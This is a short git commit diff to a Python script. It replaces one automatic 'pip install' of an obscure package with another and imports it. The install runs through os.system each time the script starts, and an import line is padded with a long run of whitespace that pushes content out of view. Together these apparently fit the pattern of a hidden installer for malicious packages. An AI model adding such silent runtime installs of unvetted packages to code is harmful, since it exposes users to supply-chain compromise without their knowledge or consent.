fae11de82a9b77de7700f82a377b485b3cf42b3a
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-21 07:21:35 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbkit")
-import pipsqlitedbkit
+os.system("pip install pipsqliteexts")
+import pipsqliteexts
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
